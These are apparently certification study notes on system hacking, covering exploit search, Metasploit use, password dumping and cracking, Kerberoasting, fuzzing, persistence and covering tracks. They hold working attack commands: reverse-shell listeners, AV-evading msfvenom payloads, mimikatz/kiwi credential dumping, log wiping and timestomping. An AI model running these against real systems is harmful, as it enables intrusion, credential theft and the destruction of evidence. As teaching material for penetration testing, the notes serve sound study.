# Chapter 7 - System Hacking

**MITRE ATT&CK note:** the techniques covered in this chapter fall under the **Execution** and **Persistence** tactics.

- **Execution** — getting your code to actually **run** on the target system (the moment an exploit turns into a running process)
- **Persistence** — making sure that access **survives** reboots, logoffs and credential changes, so you don't lose the foothold you worked to get

# Searching for Exploits

After enumeration and scanning, you have vulnerabilities — now you need **exploits** to demonstrate them. Exploitation is also how you **pivot** to other networks to look for more vulnerabilities.

## Where to find exploit code

**Exploit-DB** (`exploit-db.com`) — a public archive of **exploit code and proof-of-concept (PoC) code**.

**searchsploit** — the **command-line, offline search tool for Exploit-DB** (a local copy shipped with Kali). Lets you search the database without a browser:

```
searchsploit OpenSSH
```

Results are split into **exploits** and **shellcode**.

## Shellcode

**Shellcode** = code that gives you **shell access** on the target. It's a **hexadecimal representation of assembly-language opcodes** (the raw machine instructions). The shellcode itself is only part of the job — the rest is **delivery**: getting the shellcode into the **right place** in memory and making it execute.

Because it's raw machine code, **all shellcode is categorised by operating system and processor type** (e.g. Linux x86, Windows x64) — you must match it to the target's architecture or it won't run.

## Other sources

- **Mailing lists** — where a vulnerability is disclosed alongside a proof of concept (e.g. Full Disclosure, Bugtraq-style lists)
- **The dark web / darknet** — via search engines like **Not Evil**

---

# Cheatsheet

| Source | What it gives |
| --- | --- |
| **Exploit-DB** (`exploit-db.com`) | Public exploit + PoC code |
| **searchsploit** | Offline CLI search of Exploit-DB (Kali) |
| **Mailing lists** | Disclosures + PoC (Full Disclosure) |
| **Dark web** (Not Evil) | Underground exploit sources |

**Terms:** shellcode = hex opcodes giving shell access, matched to **OS + processor type** · delivery = getting shellcode into the right place to execute.

**Command:** `searchsploit <term>` — e.g. `searchsploit OpenSSH`.

# System Compromise

Exploitation serves **two purposes**:

1. **Demonstrate** that vulnerabilities are **legitimate**, not just theoretical
2. **Pivot further** into the organization, exposing additional vulnerabilities

## Metasploit Modules

Metasploit began as an **exploit framework** for researchers to build exploits, and has become the **go-to tool for pentesters** — almost the **entire penetration lifecycle** can run inside it. It has 1000+ **auxiliary** modules, ~2200 **exploit** modules, and can **import vulnerability scans**.

**Workflow:**

```
msfconsole                      # start Metasploit CLI
search <vuln> type:exploit      # find an exploit (type: narrows results)
use <module>                    # load the chosen exploit
show options                    # see which options must be set
set RHOSTS <target>             # target — always required (RHOST/RHOSTS)
exploit          (or run)       # launch
```

Each module has **options** — some with defaults, but the **target** (`RHOST`/`RHOSTS`) always needs setting.

## Exploit-DB

`www.exploit-db.com` — provides **proof-of-concept scripts** (often Python) you can download and run.

**searchsploit** — the on-system package for searching Exploit-DB from the CLI. It includes only **shellcode and exploits**, **not the papers** the website also hosts:

```
searchsploit "eternal blue"
```

Files are stored under `/usr/share/exploitdb/...`

**Two key terms:**

- **Exploit** — the means for an external entity to make a program **fail in a way that lets the attacker control the flow** of the program's execution
- **Shellcode** — provides a **shell** to the attacker → a way to interact with the operating system directly

## Running a downloaded exploit (EternalBlue example)

Run a PoC script you got from searchsploit / Exploit-DB (must be stored locally):

```
python 420310.py 192.168.25.3 payload
```

**This is only half the attack.** A successful run means the exploit **triggered the vulnerability** and got the remote service to **execute the shellcode**. The shellcode is an executable (assembly) that includes a **Meterpreter shell** and a way to **call back** to the attacker's system.

But a callback needs something listening. Back in Metasploit, load a **handler**:

```
use exploit/multi/handler
set LHOST <your IP>
set LPORT <your port>
exploit
```

Note the two address pairs: **RHOST** = the *remote* target; **LHOST/LPORT** = the *local* listener the shellcode calls back to.

**Meterpreter** — an **operating-system-agnostic shell**: it translates the commands you give it into ones specific to the **underlying OS**, so the same commands work across Windows, Linux, etc.

---

# Cheatsheet

**Terms**

| Term | Meaning |
| --- | --- |
| **Exploit** | Makes a program fail so the attacker controls execution flow |
| **Shellcode** | Payload giving shell/OS access |
| **Meterpreter** | OS-agnostic shell; translates commands to the target OS |
| **RHOST/RHOSTS** | Remote target |
| **LHOST/LPORT** | Local listener for the callback |

**Metasploit workflow**

```
msfconsole
search <vuln> type:exploit
use <module>
show options
set RHOSTS <target>
exploit          # or run
```

**Handler (catch the callback)**

```
use exploit/multi/handler
set LHOST <ip> ; set LPORT <port>
exploit
```

**searchsploit / Exploit-DB**

```
searchsploit "eternal blue"       # CLI search (exploits + shellcode only)
python <id>.py <target> payload   # run a downloaded PoC
```

Files stored in `/usr/share/exploitdb/`.

# Gathering Passwords

Once a system is exploited, you want to gather information about it — and credentials are the prize, because they enable **lateral movement** and **privilege escalation**. If your exploit gave you a **Meterpreter** session, it's a precious ally for this **post-exploitation** work (not every exploit yields one).

## On Windows (via Meterpreter)

| Command | What it gives |
| --- | --- |
| **`sysinfo`** | System name and operating system |
| **`hashdump`** | Username, user identifier (RID), and the **password hash** — feed these to a cracker |
| **`load mimikatz`** | Pull credentials straight from memory (LSASS) |

**mimikatz** could dump credentials with sub-commands like:

- **`msv`** — hashes from the MSV authentication package (NTLM hashes)
- **`ssp`** — credentials from Security Support Providers
- **`livessp`** — credentials from the LiveSSP provider

**Note:** the Meterpreter module is now **kiwi** (the renamed/updated mimikatz). Its result commands include:
`creds_all`, `creds_msv`, `creds_kerberos`, `lsa_dump_sam`, `lsa_dump_secrets`.

## On Linux

`hashdump` doesn't work. You need the **`/etc/shadow`** file, which requires **root**:

```
meterpreter> shell        # drop from Meterpreter to a shell
whoami                     # check privilege
# if not root → need privilege escalation first
cat /etc/shadow            # readable only as root
```

If `whoami` isn't root, you must find a **privilege escalation** before you can read `/etc/shadow`. Once you have the hashes, pass them to a **cracking program**.

*(Password hashes live in `/etc/shadow`; `/etc/passwd` holds account info but no hashes on modern systems.)*

---

# Cheatsheet

**Windows (Meterpreter)**

| Command | Purpose |
| --- | --- |
| `sysinfo` | OS + system name |
| `hashdump` | Dump SAM hashes (user, RID, hash) |
| `load kiwi` (was `load mimikatz`) | Load credential-dumping module |
| `creds_all` | Dump all credentials |
| `creds_msv` | NTLM hashes |
| `creds_kerberos` | Kerberos credentials |
| `lsa_dump_sam` / `lsa_dump_secrets` | Dump SAM / LSA secrets |

**mimikatz providers:** `msv` (NTLM) · `ssp` · `livessp`

**Linux**

```
meterpreter> shell
whoami
cat /etc/shadow     # needs root → else escalate first
```

**Key points**

- Hashes: Windows = **SAM** (`hashdump`) / **LSASS** (kiwi) · Linux = **/etc/shadow** (root only)
- mimikatz → now **kiwi** in Meterpreter
- No root on Linux → **privilege escalation** before reading shadow

# Password Cracking

A **hash** is generated each time a user enters a password, then compared against the **stored hash**. **Password cracking** = finding a value that generates the **same hash** as the stored one.

**Collision** — it's technically possible for **two different values to produce the same hash**. The defence is a **larger hash space** (more possible hash values). This is related to the **birthday paradox** — collisions become likely far sooner than intuition suggests.

## John the Ripper

An **offline** password cracker — it needs the hash file **pulled from the source** first.

**Modes:**

- **Single crack mode** — uses info from the account itself (username, GECOS/full name) as password guesses, with mangling rules. Fast first pass
- **Wordlist mode** — takes a **wordlist**, hashes each word, compares to the target hash
- **Incremental mode** — **brute force**: tries every possible character combination (slowest, most thorough)

**Linux extra step** — account info is split: public info in **`/etc/passwd`**, the actual hashes plus usernames/UIDs in **`/etc/shadow`**. Combine them with **`unshadow`** so everything John needs is in one file:

```
unshadow passwd.local shadow.local > combined.txt
john combined.txt
```

## Rainbow Tables

John is slow — it computes hashes on the fly. A **rainbow table** trades **storage for speed**: hashes are **precomputed** in advance, then you just **look up** the target hash. To limit storage, hashes are stored in **chains** (using a reduction function) rather than as one giant list.

The **RainbowCrack** project provides a tool to **generate** tables (`rtgen`) and one to **look up** passwords (`rcrack`). It is **not** used to hash a wordlist — it precomputes across a whole character space.

**Generating a table:**

```
rtgen md5 loweralpha-numeric 5 8 0 3800 33554432 0
```

| Value | Meaning |
| --- | --- |
| `md5` | Hashing algorithm |
| `loweralpha-numeric` | Character set (lowercase + digits = 36 chars per position) |
| `5` | Minimum password length |
| `8` | Maximum password length |
| `0` | Reduction-function index (maps hashes back to plaintext) |
| `3800` | Chain length |
| `33554432` | Number of chains |
| `0` | Table part (split a large table across files) |

**Cracking with a table:**

```
rcrack . -lm password.txt
```

- `.` — location of the rainbow table
- `lm` — the file contains **LAN Manager (LM)** hashes

Tables stored in `/usr/share/rainbowcrack`.

## Kerberoasting

An attack that requires **already having a foothold** (a compromised account) on the network. Named after **Kerberos**, the protocol **Active Directory** uses for network authentication — itself named after the three-headed dog of Greek mythology guarding the Underworld.

### How Kerberos works (client-server, 3 exchanges)

**KDC** = Key Distribution Center (the Kerberos server). It has two services:

**1. Authentication Service (AS)** — proving who you are

- Client → KDC: **KRB_AS_REQ** — "here is my identity"
- KDC → Client: **KRB_AS_REP** — returns a **TGT** (Ticket-Granting Ticket): "this is your ticket"

**2. Ticket-Granting Service (TGS)** — getting a ticket for a specific service

- Client → KDC: **KRB_TGS_REQ** — "I'd like a ticket for a **SPN**" (Service Principal Name)
- KDC → Client: **KRB_TGS_REP** — returns the **service ticket**

**3. Application (AP)** — using the service

- Client → Server: **KRB_AP_REQ** — "I'd like to access the service"
- Server → Client: **KRB_AP_REP** — "access authorised/denied"

Messages between client and Kerberos server are **encrypted with a key derived from the user's password**.

### The attack

The service ticket (KRB_TGS_REP) is **encrypted with the hash of the service account's password**. So an authenticated attacker can **request service tickets for any SPN**, take them **offline, and crack them** to recover the service account's password — often a high-privilege account. No special rights needed beyond a valid domain account, which is what makes it powerful.

**Rubeus** — a tool to perform Kerberoasting. Needs a username/password (a hash also works).

Request a TGT:

```
.\rubeus.exe asktgt /user:bogus /password:AB4dpW22! /domain:washere.local /dc:192.168.4.218
```

Kerberoast (harvest crackable service tickets):

```
.\rubeus.exe kerberoast /user:bogus /domain:washere.local /dc:192.168.4.218
```

This enables **lateral movement**, but requires a **foothold already**.

---

# Cheatsheet

**Concepts**

| Term | Meaning |
| --- | --- |
| **Collision** | Two inputs → same hash (birthday paradox) |
| **Rainbow table** | Precomputed hashes in chains — storage for speed |
| **Reduction function** | Maps a hash back to a candidate plaintext (builds chains) |
| **Kerberoasting** | Request service tickets, crack them offline for the service account password |
| **TGT / TGS / SPN** | Ticket-Granting Ticket / Ticket-Granting Service / Service Principal Name |

**John the Ripper**

| Mode | Method |
| --- | --- |
| Single crack | Guesses from account info + rules |
| Wordlist | Hash each word in a list |
| Incremental | Full brute force |

```
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
john --incremental combined.txt
```

**RainbowCrack**

```
rtgen md5 loweralpha-numeric 5 8 0 3800 33554432 0   # generate
rtsort .                                              # sort (before cracking)
rcrack . -lm password.txt                             # crack LM hashes
```

**Kerberos exchanges:** AS (REQ/REP → TGT) → TGS (REQ/REP → service ticket) → AP (REQ/REP → access).

**Rubeus**

```
.\rubeus.exe asktgt /user:<u> /password:<p> /domain:<d> /dc:<ip>
.\rubeus.exe kerberoast /user:<u> /domain:<d> /dc:<ip>
```

**Key points**

- John = offline, needs the hash file · `unshadow` merges passwd + shadow
- Rainbow tables ≠ hashing a wordlist — they precompute a whole keyspace; `lm` = LM hashes
- Kerberoasting needs an existing domain foothold; service tickets crack to **service-account** passwords
- Tools to know: **John**, **RainbowCrack** (rtgen/rcrack), **Rubeus** (also Hashcat, Impacket's GetUserSPNs)

# Client-side Vulnerabilities

There are **far more desktops than servers**, which makes **users an easy pathway** into systems. Exploiting them requires **client-side vulnerabilities** — flaws that exist **on the desktop** and **aren't exposed to the outside world without client interaction**.

The key difference from server-side: a server vulnerability is reachable directly over the network, but a client-side one only triggers when the **user does something** — opens a file, an email, a page. So these attacks are paired with **social engineering** to get the user to act.

**Example:** a vulnerability in a **mail client** → the attacker sends an email → the client **opens** it → the vulnerability triggers → the attacker gains access.

**Web browsers** make especially convenient attack vectors — they run complex code (JavaScript, plugins, rendering engines) on untrusted content from any site the user visits.

# Living Off the Land

**Living off the land (LOTL)** = making use of the **tools already available on the target system** instead of bringing your own. The advantage: legitimate built-in tools **don't trigger antivirus** and **blend into normal activity**, so there's nothing malicious on disk to detect. The tools abused this way are called **LOLBins** (living-off-the-land binaries).

## Windows — PowerShell

**PowerShell** is the main LOTL tool on Windows: an **object-oriented** scripting language whose functionality comes from **cmdlets** (small command units). It's powerful, present by default, trusted, and can run code **in memory** without writing files.

**Frameworks built on it:**

- **Empire** — a **post-exploitation framework** written in PowerShell: provides C2, agents and modules for persistence, privilege escalation and credential theft after the initial compromise
- **PowerSploit** — a collection of offensive PowerShell modules; **no longer maintained**, but still usable

## Linux — the shell

On Linux the equivalent is the **shell** (bash, etc.) plus the standard system binaries.

**Note:** PowerShell is now **cross-platform** — available on **Linux and macOS** too, not just Windows.

---

# Cheatsheet

| Term / Tool | Meaning |
| --- | --- |
| **LOTL** | Use built-in tools → evade AV, blend in |
| **LOLBins** | Legitimate binaries abused for attacks |
| **PowerShell** | Windows object-oriented scripting; uses **cmdlets**; runs in memory |
| **Empire** | PowerShell post-exploitation / C2 framework |
| **PowerSploit** | Offensive PowerShell modules (unmaintained) |
| **Shell (bash)** | Linux LOTL equivalent |

**Key points:** LOTL avoids detection because the tools are trusted and native · PowerShell is now cross-platform (Linux/macOS).

# Fuzzing

## What fuzzing is

**Fuzzing = throwing unexpected or malformed data at an application to see how it copes.** You deliberately feed a program garbage — oversized values, wrong types, broken structure — and watch what happens:

- **Handled well** → the app logs an error or discards the data (nothing interesting)
- **Handled badly** → the app **crashes** → you've found a **bug**, potentially an exploitable vulnerability

**Two goals:** find bugs in software, and cause **denial of service** (a crash *is* a DoS). A crash is also the starting point for developing a real exploit, since a program that mishandles input often lets an attacker control execution.

## Historical / older tools

- **Codenomicon** — famously found serious flaws in **DNS and SNMP** implementations. No longer used
- **Sulley** — an older Python fuzzing framework (now largely succeeded by others like boofuzz)

## Peach — network and file fuzzing

**Peach** does both network and file fuzzing, using **XML** as its definition language. To run a fuzzing job you define several elements:

| Element | Role |
| --- | --- |
| **Data model** | Defines the **data** sent to the app, and marks **which parts** get mutated into bad data. You can have several |
| **State model** | Tells Peach **how** the data model is used — the sequence/logic of the exchange |
| **Publisher** | Tells Peach **how to communicate** with the app (e.g. over the network, or by writing a file) |
| **Logger** | Records **evidence** of what happened (so you can see the crash later) |

```
.\peach.exe .\samples\http.xml
```

## Network vs file fuzzing

Some vulnerabilities are **local** and **won't trigger over the network** — they need a **file** to set them off (think a malicious PDF opened by a viewer). This is **file-based fuzzing**:

- You supply a **sample file** (a normal, valid one)
- The fuzzer **repeatedly opens the file with altered data**, mutating it each time until something crashes

Peach handles file fuzzing too, and so do these:

**sfuzz** (Kali) — comes with **template files**, e.g. a `basic.smtp` template to test an email server.

**American Fuzzy Lop (AFL)** — a very popular fuzzer for **file formats**; it mutates a file to cause local crashes. Available as `afl-fuzz` in Kali:

```
afl-fuzz -t 100000 -n -i pdfs -o pdf-results
```

| Flag | Meaning |
| --- | --- |
| `-t 100000` | Timeout per run (ms) |
| `-n` | "Dumb" mode (no instrumentation guidance) |
| `-i pdfs` | **Input** folder of sample PDFs to mutate |
| `-o pdf-results` | **Output** folder for results/crashes |

*(AFL is normally "coverage-guided" — it watches which code paths each input reaches and evolves inputs to explore more of the program, which finds bugs far faster. `-n` turns that off for a basic run.)*

---

# Cheatsheet

**Concept:** feed malformed input → app crashes → bug/DoS/exploit starting point.

**Peach elements**

| Element | Role |
| --- | --- |
| Data model | What data is sent + what gets mutated |
| State model | How/when the data is used |
| Publisher | How Peach talks to the app |
| Logger | Records what happened |

**Tools**

| Tool | Purpose |
| --- | --- |
| **Peach** | Network + file fuzzing, XML-defined |
| **sfuzz** | Kali fuzzer with protocol templates (e.g. basic.smtp) |
| **AFL** (`afl-fuzz`) | Coverage-guided file-format fuzzing |
| **Codenomicon / Sulley** | Older fuzzers (DNS/SNMP; now dated) |

**Commands**

```
.\peach.exe .\samples\http.xml
afl-fuzz -t 100000 -n -i pdfs -o pdf-results
```

**Key points:** network fuzzing ≠ file fuzzing — local bugs often need a file to trigger · a crash = potential DoS and possible exploit · AFL is normally coverage-guided (smarter than random).

# Post-Exploitation

Once you're in, the goals are: **escalate privileges, pivot to other systems, stay in, and erase your tracks**.

## Evasion

Your **foothold** is a username/password or actual remote access. But antimalware and EDR are watching — you need to avoid being detected.

**On disk** — files are the easiest thing for AV to detect:

- Use **Alternate Data Streams (ADS)** to hide files in NTFS
- **Encrypt or obfuscate** payloads — encrypted zip files slip past many AV engines
- Encrypt payloads generated by Metasploit before dropping them

**On execution** — AV watches executables, but may miss scripts:

- Use **PowerShell** — no file dropped, runs in memory, often undetected
- But PowerShell may be **logged** — so obfuscate it with **Invoke-Obfuscation**

## Privilege Escalation

Goal: get **root (Linux) or Administrator/SYSTEM (Windows)** → full access to everything on the system.

**The most common path:** local exploits — vulnerabilities in the OS or installed software that let a low-privilege user get higher access.

**Linux note:** some apps run with **setuid** — they run as the **file owner** (often root) regardless of who launches them. A setuid binary with a vulnerability = instant privilege escalation.

**Windows — windows-exploit-suggester.py** (Python 2 only):

Step 1 — get the system's patch info:

```
meterpreter> shell
systeminfo > patches.txt
exit
meterpreter> download patches.txt
```

Step 2 — update the Microsoft Security Bulletin database and run the script:

```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py -i patches.txt -d 2025-01-09-mssb.xls -l
```

It gives you a list of **local exploits** that could work against the target.

**Running a Metasploit privesc module:**

```
use exploit/unix/misc/distcc_exec
set RHOST <ip>
exploit
```

**Cross-compiling note:** if you compile a C exploit on a **64-bit** machine for a **32-bit** target, you need special cross-compilation libraries. Host the binary on a web server to transfer it.

**Catch a reverse shell with netcat:**

```
netcat -lvnp 5555
```

## Pivoting

After compromising a system, you may find it has **multiple network interfaces** — it's connected to networks you couldn't reach from outside. **Pivoting** = routing your attack traffic **through** the compromised system into those other networks.

Step 1 — check the interfaces:

```
meterpreter> ipconfig
# Interface 1: 172.30.42.3  ← internal network you couldn't see
# Interface 2: 192.168.2.3
```

Step 2 — add a route through the compromised system to the internal network:

```
meterpreter> run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD
```

Step 3 — background the session and run any module against that new network:

```
meterpreter> background
sessions          # see session number to reuse later
```

You can now scan and attack `172.30.42.0/24` as if you were on that network.

## Persistence

You don't want to re-exploit the same vulnerability every visit — it's slow, and it might get patched. **Persistence** = making sure access **survives reboots** without re-exploiting.

### Option 1 — Create a user

If SSH or RDP is available, create a user that can **log in remotely**. Simple but very visible.

### Option 2 — Reverse shell (preferred)

Firewalls often **block inbound** connections but **allow outbound**. So install a payload that **calls back to you** (reverse shell) — you just need a listener.

Using the registry to store and run a payload at boot:

```
meterpreter> use exploit/windows/local/registry_persistence
set SESSION <session number>
exploit
```

### Option 3 — Custom executable with msfvenom

Create a standalone payload, **encoded** to evade antivirus:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.56 LPORT=3445 -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o elfbowling.exe
```

- `p` — payload
- `f exe` — output format
- `e x86/shikata_ga_nai` — encoder (evades AV)
- `i 3` — 3 encoding iterations
- `o elfbowling.exe` — output file name

Install it on the target via Metasploit:

```
meterpreter> run post/windows/manage/persistence_exe REXEPATH=/root/elfbowling.exe
```

### Option 4 — BITS (Windows Background Intelligence Transfer Service)

A **legitimate Windows service** that runs updates quietly in the background. Attackers abuse it with **PowerShell** to create a BITS job that downloads and runs malicious code — then cleans up after itself. Stealthy because it uses a trusted service.

### Option 5 — DLL hijacking / file type hijacking

- A **malicious DLL** is placed where a legitimate app will load it (it loads yours instead)
- **Registry keys** can be altered to change the handlers for certain file types — opening a document triggers your payload instead

**All persistence methods leave artefacts** (files, registry entries) that can be found and flagged.

## Covering Tracks

Every action leaves **footprints** — files, logs, processes. If defenders find them, your access gets removed and your actions get investigated.

### Rootkits

The **process table** lives in **kernel space** (ring 0 — the highest privilege level, where the kernel directly controls hardware). You normally can't touch it from outside.

A **rootkit** is a collection of software that manipulates what the OS shows:

- A **kernel module/driver** that **filters** the process table output — your processes are invisible
- **Replacement binaries** (e.g. a fake `ls` or `ps`) that hide your files and processes from anyone using normal system tools

The rootkit itself needs to know the names and properties of its own processes to filter them out.

### Process Injection

Instead of running your own process (visible in the process list), **inject your code into an existing legitimate process** (e.g. explorer.exe, svchost.exe). Anyone looking at the process list sees a normal process behaving slightly oddly — much harder to spot.

On Windows, this works by getting a **handle** (a pointer to the process entry) via the Windows API, then allocating memory inside that process and injecting code.

```
meterpreter> run post/windows/manage/multi_meterpreter_inject PID=3940 PAYLOAD=windows/shell_bind_tcp
```

Or **migrate** your existing Meterpreter session into another process:

```
meterpreter> run post/windows/manage/migrate
```

On **Linux/macOS**: use environment variables to preload your malicious libraries before the real ones:

- Linux: `LD_PRELOAD`
- macOS: `DYLD_INSERT_LIBRARIES`

### Log Manipulation

Logs are the evidence. Deal with them based on what's available:

**Nuclear option** — wipe everything:

- Windows: `clearev` in Meterpreter (needs **LOCALSYSTEM**, not LOCAL SERVICE)
- Linux: delete log files, or **stop the syslog process** as soon as you arrive

**Surgical option** (Linux, if auditing is not enabled) — **edit** specific log entries. If there's no auditing, the edits are **undetectable**.

**Central logs (SIEM)** — if logs are shipped to a remote SIEM (Splunk, Elastic), clearing local logs may not be enough — the evidence is already off the box.

### Hiding Files

**Windows:**

- Store files in **temporary or cache directories** — e.g. `C:\Users\username\AppData\Local\...` (hidden by default in Explorer)
- Use **Alternate Data Streams (ADS)** — NTFS lets you attach hidden data streams to any file:

```
type malware.exe > legitfile.txt:hidden.exe
```

Note: executables stored in an ADS **can't be run directly** — you must extract them first. Also: **Volume Shadow Copies** (Windows backup snapshots) can preserve old versions of your files — these may survive your cleanup.

**Linux:**

- Use **dot files and directories** — any filename starting with `.` is hidden from normal `ls` output (e.g. `.bashrc`, `.hidden/`)

### Timestomping

Every file has **Modified, Accessed and Created** timestamps. Forensic investigators check these. **Timestomping** modifies a file's timestamps to match a legitimate file, so it doesn't stand out:

```
meterpreter> upload regedit.exe
meterpreter> timestomp regedit.exe -f C:\\Windows\\regedit.exe
```

This copies the legitimate `regedit.exe` timestamps onto your uploaded file.

---

# Cheatsheet

**Evasion**

```
Invoke-Obfuscation     # PowerShell obfuscation cmdlet
```

**Privilege Escalation**

```
meterpreter> shell
systeminfo > patches.txt ; exit
meterpreter> download patches.txt

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py -i patches.txt -d 2025-01-09-mssb.xls -l

use exploit/unix/misc/distcc_exec
netcat -lvnp 5555                  # catch reverse shell
```

**Pivoting**

```
meterpreter> ipconfig
meterpreter> run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD
meterpreter> background
sessions
```

**Persistence**

```
use exploit/windows/local/registry_persistence → set SESSION → exploit

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o payload.exe

meterpreter> run post/windows/manage/persistence_exe REXEPATH=/root/payload.exe
```

**Process injection / migration**

```
meterpreter> run post/windows/manage/multi_meterpreter_inject PID=<pid> PAYLOAD=windows/shell_bind_tcp
meterpreter> run post/windows/manage/migrate
```

**Log clearing**

```
meterpreter> clearev                    # Windows (needs LOCALSYSTEM)
# Linux: delete /var/log/* or stop syslog
```

**Timestomping**

```
meterpreter> timestomp <file> -f C:\\Windows\\regedit.exe
```

**Key concepts**

| Concept | Meaning |
| --- | --- |
| **Pivoting** | Route traffic through a compromised host to reach internal networks |
| **Reverse shell** | Payload calls back out (bypasses inbound firewall rules) |
| **msfvenom** | Build standalone encoded payloads |
| **BITS** | Windows legit update service — abused for persistence |
| **Rootkit** | Filters OS output (process list, file list) to hide the attacker |
| **Process injection** | Hide code inside a legitimate running process |
| **ADS** | NTFS hidden data stream — file within a file |
| **Timestomping** | Fake file timestamps to match legitimate files |
| **LD_PRELOAD** | Linux env var to preload attacker libraries before system ones |
| **Dot files** | Linux hidden files/dirs (start with `.`) |

# System Hacking with AI

AI accelerates both sides — **attack and defence** — by handling information processing, automation and analysis at a speed humans can't match.

## AI and Vulnerabilities

### How AI helps attackers

AI **lowers the skill, time and effort** required to exploit systems:

- **Finding vulnerabilities faster** — AI can scan codebases and configurations far more quickly than manual review
- **Understanding CVEs** — AI processes and summarises public vulnerability information, turning a CVE advisory into an actionable attack plan without needing deep expertise
- **Locating weak configurations** — AI spots misconfigurations across large environments that a human would miss or take hours to review

### How AI helps defenders

AI is a **force multiplier** for the blue team:

- **Vulnerability detection** — automated scanning and code analysis at scale
- **Vulnerability prediction** — AI identifies patterns in code or infrastructure that are **likely** to become vulnerabilities, before they're exploited

## AI and Exploitation

### How AI helps attacks

- **Automated vulnerability discovery** — AI finds exploitable flaws without manual research
- **Zero-day generation and weaponisation** — AI can discover unknown vulnerabilities and build working exploits for them
- **Smart payload crafting and evasion** — AI generates payloads that adapt to the target's defences, automatically modifying themselves to bypass AV, EDR and signatures

### How AI helps defend against exploitation

- **Vulnerability discovery and patching (before exploitation)** — AI finds and prioritises flaws so they're patched before attackers reach them
- **Real-time exploit prevention** — AI-driven detection catches exploit attempts as they happen, even for unknown (zero-day) attacks, by recognising anomalous behaviour rather than relying on signatures
- **Threat hunting and incident response** — AI correlates alerts, logs and telemetry to surface active threats and accelerate investigation
- **Deception and honeypots** — AI-powered honeypots that dynamically adapt, appearing more realistic to lure and study attackers

## AI and Operating System Attacks

**Living off the land (LOTL)** attacks use legitimate system tools, admin utilities and built-in OS features — making them **hard to detect and protect against** because nothing "malicious" is installed.

AI supercharges LOTL in several ways:

| Capability | What AI does |
| --- | --- |
| **Discovery and recon** | AI automates internal enumeration using native tools, mapping the environment faster and more quietly |
| **Command-line obfuscation** | AI generates obfuscated commands that do the same thing but evade detection rules and logging |
| **Fileless execution** | AI crafts and chains in-memory payloads that never touch disk — the hardest type of attack for traditional AV to catch |
| **Credential dumping** | AI identifies the best technique for the target OS and configuration, and adapts in real time if one method is blocked |
| **Persistence** | AI selects the stealthiest persistence mechanism for the specific environment (registry, scheduled tasks, services, WMI) |
| **Defence evasion in real time** | AI monitors the target's defences and **adapts on the fly** — if one evasion technique is caught, it switches to another without human intervention |

**The arms race:** AI makes LOTL attacks harder to detect because the attacker's behaviour looks like legitimate admin activity. But AI also gives defenders the ability to spot **subtle patterns** in that activity that a human analyst would miss — anomalous timing, unusual command sequences, unexpected parent-child process relationships.

![image.png](image.png)